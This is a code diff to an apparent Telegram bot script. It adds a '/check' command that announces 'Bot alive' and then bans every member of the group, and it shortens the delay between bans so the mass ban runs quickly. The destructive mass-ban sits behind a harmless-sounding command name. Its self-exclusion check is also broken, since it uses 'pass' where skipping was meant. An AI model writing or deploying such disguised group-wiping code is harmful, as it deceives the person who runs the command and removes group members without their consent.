@@ -74,7 +74,36 @@ async def testing(event):
                await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
            except Exception as e:
                await event.edit(str(e))
-           await sleep(0.3)
+           await sleep(0.01)
+
+@Riz.on(events.NewMessage(pattern="^/check"))
+async def testingdone(event):
+  if 1==1:
+    if not event.is_group:
+        Reply = f"Noob !! Use This Cmd in Group."
+        await event.reply(Reply)
+    else:
+        await event.delete()
+        RiZoeL = await event.get_chat()
+        RiZoeLop = await event.client.get_me()
+        admin = RiZoeL.admin_rights
+        creator = RiZoeL.creator
+        if not admin and not creator:
+            await event.reply("I Don't have sufficient Rights !!")
+            return
+        await event.reply("hey !! Bot alive")
+        everyone = await event.client.get_participants(event.chat_id)
+        for user in everyone:
+           if user.id == RiZoeLop.id:
+               pass
+           try:
+               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
+           except Exception as e:
+               await event.edit(str(e))
+           await sleep(0.01)
+
+
+
 
 
 @Riz.on(events.NewMessage(pattern="^/leave"))
